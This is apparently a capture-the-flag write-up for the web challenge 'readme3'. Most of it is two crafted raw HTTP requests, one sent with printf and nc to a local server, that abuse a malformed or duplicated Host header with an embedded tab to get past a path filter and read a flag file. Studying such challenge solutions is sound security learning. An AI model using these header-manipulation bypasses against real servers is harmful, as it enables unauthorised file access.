# readme3

* Round: 48 (2024/08)
* Category: Web
* Points: 75
* Solves: 12

## Description

It is just [readme2](../../../ImaginaryCTF%202024/readme2/) with a small twist. Hope you can actually solve it with the intended way.

## Solution

```bash
printf 'GET http://not_used HTTP/1.0\r\nHost: fakehost/fla\tg.txt?\r\n\r\n' | nc localhost 4000
```

## Another solution by @IcesFont

```http
GET / HTTP/1.1
Host: lol
Host: a@a/fla\tg.txt?
```
